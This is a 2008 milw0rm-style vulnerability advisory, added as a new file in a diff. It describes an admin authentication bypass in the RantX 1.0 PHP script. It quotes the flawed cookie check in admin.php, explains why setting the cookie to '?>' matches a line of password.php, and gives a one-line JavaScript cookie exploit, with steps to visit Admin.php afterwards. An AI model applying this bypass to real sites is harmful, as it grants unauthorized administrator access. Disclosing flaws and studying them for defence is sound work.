@@ -1,0 +1,85 @@
+--==+================================================================================+==--
+--==+		  RantX 1.0 Insecure Admin Authentication Vulnerability	             +==--
+--==+================================================================================+==--
+
+
+
+Discovered By: t0pP8uZz
+Discovered On: 14 MAY 2008
+Script Download: http://roticv.rantx.com/rantx.zip
+DORK: N/A
+
+
+
+Vendor Has Not Been Notified!
+
+
+
+DESCRIPTION: 
+
+RantX suffers from a insecure admin authentication peice of code, the code is below. (in middle of admin.php)
+
+CODE:
+
+if ($_COOKIE["logininfo"] == NULL){
+	LoginPage();
+	exit(-1);
+}
+$storedformat = $_COOKIE["logininfo"];
+$filehandle = fopen($passwordfile, "r");
+$contents = fread ($filehandle, filesize ($passwordfile));
+fclose ($filehandle);
+$array2 = explode("\n", $contents);
+foreach ($array2 as $values){
+	if (strcmp($values, $storedformat) == 0){
+		$passwordvalid = true;
+	}
+}
+
+__EOF__
+
+ok as we can see, the first thing is that the script checks to see if the cookie "logininfo" exists,
+we can simply craft a cookie with javascript to bypass this part, or form a legit login request.
+
+next the password file is opened, then the lines are split into an array, then they are looped thru, if the
+line matches the cookie then authentication to admin is GIVEN (TRUE).
+
+if you check the password.php source, you can see it contains the php tags, of course. (<?php/?>)
+so what if we give the cookie a value of "<?php" or "?>" then when the cookie is checked against the password
+file, one line will return TRUE which will give us admin, as strcmp() compares a string, and since
+the password.php file contains "?>" and our cookie will contain "?>" we will get access.
+
+the below javascript code will exploit this bug.
+
+
+
+Exploit:
+
+javascript:document.cookie = "logininfo=?>; path=/";
+
+
+
+NOTE/TIP: 
+
+after running the above javascript code in your browser (preferbly firefox/netscape), vist "Admin.php"
+
+this should come to your attention how many web-developers are very bad coders. and leave massive
+easy-to-fix holes like this in there scripts.
+
+just remember when downloading a file of any kind to read through its source, and make sure its secure
+
+
+
+GREETZ: milw0rm.com, h4ck-y0u.org, CipherCrew !
+
+
+
+peace, t0pP8uZz
+
+
+
+--==+================================================================================+==--
+--==+		  RantX 1.0 Insecure Admin Authentication Vulnerability	             +==--
+--==+================================================================================+==--
+
+# milw0rm.com [2008-05-15]
